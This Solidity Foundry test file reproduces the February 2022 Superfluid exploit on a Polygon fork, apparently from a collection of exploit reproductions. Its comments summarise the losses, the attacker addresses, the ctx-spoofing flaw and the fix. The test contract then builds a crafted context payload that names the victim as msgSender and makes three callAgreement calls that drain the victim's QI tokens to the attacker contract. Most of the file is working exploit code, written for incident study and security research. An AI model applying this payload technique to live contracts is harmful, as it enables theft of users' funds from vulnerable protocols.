// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
import {IERC20} from "../../interfaces/IERC20.sol";


// forge test --match-contract Exploit_Superfluid -vvv
/*
On Feb 08, 2022 an attacker stole ~$8.7MM in multiple tokens from users that interacted with Superfluid.

// Attack Overview
Total Lost: 
19.4M QI
24.4 WETH
563k USDC
45k SDT
24k STACK
39k sdam3CRV
1.5M MOCA 
11k MATIC

Attack Tx: https://polygonscan.com/tx/0x396b6ee91216cf6e7c89f0c6044dfc97e84647f5007a658ca899040471ab4d67
Ethereum Transaction Viewer: https://tx.eth.samczsun.com/polygon/0x396b6ee91216cf6e7c89f0c6044dfc97e84647f5007a658ca899040471ab4d67

Exploited Contract: 
Attacker Address: https://polygonscan.com/address/0x1574f7f4c9d3aca2ebce918e5d19d18ae853c090
Attacker Contract: https://polygonscan.com/address/0x32D47ba0aFfC9569298d4598f7Bf8348Ce8DA6D4
Attack Block: 24685148 

// Key Info Sources
Twitter: https://twitter.com/Superfluid_HQ/status/1491045880107048962
Writeup: https://medium.com/superfluid-blog/08-02-22-exploit-post-mortem-15ff9c97cdd
Article: https://rekt.news/superfluid-rekt/

Principle: Calldata crafting to perform transfers

ATTACK:
Superfluid allows users to perform different transactions that compain with an "agreement". The agreement then  depending the transaction parameters can execute
different actions such as transfering tokens. In the encoded parameters for the transaction, Superfluid required the msg.sender as a param as
delegated calls are performed later losing preservation of the msg.sender context dependant variable. The attacker exploited this by crafting the payload of
a transaction passing the sender as the victim and the destination as the malicious contract.

MITIGATIONS:
1) The team mitigated this by checking that the hash of the ctx matches the stamp of the transaction related to that ctx (similar to a nonce check).

    function _isCtxValid(bytes memory ctx) private view returns (bool) {
        return ctx.length != 0 && keccak256(ctx) == _ctxStamp;
    }

*/
/*
    Serialize Function
        function _updateContext(Context memory context)
        private
        returns (bytes memory ctx)
    {
        require(context.appLevel <= MAX_APP_LEVEL, "SF: APP_RULE_MAX_APP_LEVEL_REACHED");
        uint256 callInfo = ContextDefinitions.encodeCallInfo(context.appLevel, context.callType);
        uint256 allowanceIO =
            context.appAllowanceGranted.toUint128() |
            (uint256(context.appAllowanceWanted.toUint128()) << 128);
        ctx = abi.encode(
            abi.encode(
                callInfo,
                context.timestamp,
                context.msgSender,
                context.agreementSelector,
                context.userData
            ),
            abi.encode(
                allowanceIO,
                context.appAllowanceUsed,
                context.appAddress,
                context.appAllowanceToken
            )
        );
        _ctxStamp = keccak256(ctx);
    }

        
    function encodeCallInfo(uint8 appLevel, uint8 callType)
        internal pure
        returns (uint256 callInfo)
    {
        return uint256(appLevel) | (uint256(callType) << CALL_INFO_CALL_TYPE_SHIFT);
    }

    Deserialize Function
            function _decodeCtx(bytes memory ctx)
            private pure
            returns (Context memory context)
        {
            bytes memory ctx1;
            bytes memory ctx2;
            (ctx1, ctx2) = abi.decode(ctx, (bytes, bytes));
            {
                uint256 callInfo;
                (
                    callInfo,
                    context.timestamp,
                    context.msgSender,
                    context.agreementSelector,
                    context.userData
                ) = abi.decode(ctx1, (
                    uint256,
                    uint256,
                    address,
                    bytes4,
                    bytes));
                (context.appLevel, context.callType) = ContextDefinitions.decodeCallInfo(callInfo);
            }
            {
                uint256 allowanceIO;
                (
                    allowanceIO,
                    context.appAllowanceUsed,
                    context.appAddress,
                    context.appAllowanceToken
                ) = abi.decode(ctx2, (
                    uint256,
                    int256,
                    address,
                    ISuperfluidToken));
                context.appAllowanceGranted = allowanceIO & type(uint128).max;
                context.appAllowanceWanted = allowanceIO >> 128;
            }
        }
*/

interface ISuperfluid {
    function callAgreement(address agreementClass, bytes memory callData, bytes memory userData) external returns (bytes memory);
}

contract Exploit_Superfluid is TestHarness, TokenBalanceTracker {
    ISuperfluid internal superfluid = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    address internal agreementIDAV2 = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;

    IERC20 internal qi = IERC20(0xe1cA10e6a10c0F72B74dF6b7339912BaBfB1f8B5);

    address internal victim = 0x5073c1535A1a238E7c7438c553F1a2BaAC366cEE;

    uint256 constant internal CALL_INFO_CALL_TYPE_SHIFT = 32;
    uint256 constant internal CALL_INFO_CALL_TYPE_MASK = 0xF << CALL_INFO_CALL_TYPE_SHIFT;
    uint256 constant internal CALL_INFO_APP_LEVEL_MASK = 0xFF;


    function setUp() external {
        cheat.createSelectFork("polygon", 24685147); 
        cheat.deal(address(this), 0);

        addTokenToTracker(address(qi));
        updateBalanceTracker(address(this));
        updateBalanceTracker(victim);


        console.log("==== INITIAL BALANCES ====");
        logBalancesWithLabel('Attacker', address(this));
        logBalancesWithLabel('Victim', victim);
    }


    function test_attack() external {
       
        bytes memory maliciousPayloadFromTraces = hex'0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005073c1535a1a238e7c7438c553f1a2baac366cee000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000';
        
        bytes memory maliciousPayloadConstructed = abi.encode(
            abi.encode(
                encodeCallInfo(0,1), // Get encoded call info by shifting depending on the app and call type.
                block.timestamp,
                victim, 
                bytes4(0),
                new bytes(0)
            ),
            abi.encode(
                0,
                0,
                address(0),
                address(0)
            )
        );
       
        bytes memory callData1 = abi.encodeWithSignature("updateSubscription(address,uint32,address,uint128,bytes)", 
            address(qi),
            98789,
            address(this),
            qi.balanceOf(victim),
            maliciousPayloadConstructed
        );
        

        bytes memory callData2 = abi.encodeWithSignature("updateIndex(address,uint32,uint128,bytes)", 
            address(qi),
            98789,
            1,
            maliciousPayloadConstructed
        );

        bytes memory callData3 = abi.encodeWithSignature("claim(address,address,uint32,address,bytes)", 
            address(qi),
            victim,
            98789,
            address(this),
            new bytes(0)
        );

        console.log("==== STEP 1: INJECT PAYLOAD ====");
        logBalancesWithLabel('Attacker', address(this));
        logBalancesWithLabel('Victim', victim);
                
        superfluid.callAgreement(agreementIDAV2, callData1, new bytes(0));

        superfluid.callAgreement(agreementIDAV2, callData2, new bytes(0));

        superfluid.callAgreement(agreementIDAV2, callData3, new bytes(0));


        console.log("==== STEP 2: AFTER INJECTION ====");
        logBalancesWithLabel('Attacker', address(this));
        logBalancesWithLabel('Victim', victim);
    }

        
    function encodeCallInfo(uint8 appLevel, uint8 callType)
        internal pure
        returns (uint256 callInfo)
    {
        return uint256(appLevel) | (uint256(callType) << CALL_INFO_CALL_TYPE_SHIFT);
    }
    
    function decodeCallInfo(uint256 callInfo)
        internal pure
        returns (uint8 appLevel, uint8 callType)
    {
        appLevel = uint8(callInfo & CALL_INFO_APP_LEVEL_MASK);
        callType = uint8((callInfo & CALL_INFO_CALL_TYPE_MASK) >> CALL_INFO_CALL_TYPE_SHIFT);
    }
}

